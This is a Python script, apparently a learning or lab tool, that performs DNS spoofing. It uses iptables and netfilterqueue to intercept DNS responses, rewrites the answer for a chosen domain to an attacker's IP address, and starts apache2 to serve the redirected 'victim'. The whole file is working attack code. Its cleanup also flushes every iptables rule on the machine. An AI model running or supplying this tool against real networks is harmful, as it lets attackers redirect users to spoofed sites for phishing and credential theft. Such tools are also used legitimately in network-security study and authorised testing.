#!/usr/bin/env python3

import argparse             # https://docs.python.org/3/library/argparse.html
import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
import os                   # https://docs.python.org/3/library/os.html
import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
import subprocess           # https://docs.python.org/3/library/subprocess.html
import sys                  # https://docs.python.org/3/library/sys.html
import textwrap             # https://docs.python.org/3/library/textwrap.html


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser(
        description="DNS spoof tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example: 
            dns_spoofer.py -q forward               # spoof domain on target (Windows)
            dns_spoofer.py -d sqa.fyicenter.com     # domain
            dns_spoofer.py -r 192.168.122.108       # redirection address
            dns_spoofer.py                          # with defaults local, apache2 and fyicenter.com
        """
        ),
    )
    parser.add_argument("-d", "--domain", default="sqa.fyicenter.com", help="Domain to spoof")
    parser.add_argument("-r", "--ip", default="192.168.122.108", help="IP address to redirect to")
    parser.add_argument("-q", "--destination", default="local", help="Forward or local")
    values = parser.parse_args()
    return values


def apache_start():
    print("[+] Starting apache2 service ...")
    try:
        subprocess.check_output(["service", "apache2", "start"])
    except subprocess.CalledProcessError:
        print("[-] Not found. Installing and starting apache2 service...")
        subprocess.call("apt-get install apache2 -y", shell=True)
        subprocess.call("service apache2 start", shell=True)


def run_queue(destination, qnum):
    print("[+] Creating iptables queue(s)")
    if destination == "forward":
        subprocess.call(
            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    elif destination == "local":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    else:
        print("[-] Unknown destination")

    # Create netfilterqueue instance
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue number 0 (queue three in iptables)
    queue.bind(qnum, process_packet)
    # Run the queue
    queue.run()


def restore():
    print("[+] Flushing iptables queue(s)")
    subprocess.call("iptables --flush", shell=True)
    print("[+] Stopping apache server")
    subprocess.call("service apache2 stop", shell=True)


def forge_packet(packet):
    # Get the DNS Query name from the scapy packet.
    # Query name is the host name sent by the victim to the DNS server.
    qname = packet[scapy.DNSQR].qname

    # If the query name is our target domain,
    # modify the DNS sent IP address with IP address in arguments.
    if options.domain + "." == qname.decode():
        print("[+] Spoofing Target")
        answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
        packet[scapy.DNS].an = answer
        # Modify the packet ancount with 1,
        # Send a single DNSRR to the victim.
        packet[scapy.DNS].ancount = 1
        # Packet corruption can be detected using the checksum and
        # len fields. By deleting these scapy generates new entries.
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].chksum
        del packet[scapy.UDP].len
    return packet


def process_packet(packet):
    # Convert the NetfilterQueue packet into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())

    # If the scapy packet has the DNS Resource Record(DNSRR),
    # and if it is intended for our target domain, modify the
    # packet, otherwise no changes will be made.
    if scapy_packet.haslayer(scapy.DNSRR):
        forged_packet = forge_packet(scapy_packet)
        # Set the forged scapy packet payload to the
        # NetfilterQueue packet.
        packet.set_payload(bytes(forged_packet))

    # Forward to the victim.
    packet.accept()


if __name__ == "__main__":
    if is_not_root():
        sys.exit("[-] This script requires superuser privileges.")

    options = get_args()
    try:
        apache_start()
        run_queue(options.destination, 3)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ... ")
        restore()
        print("[+] Done")
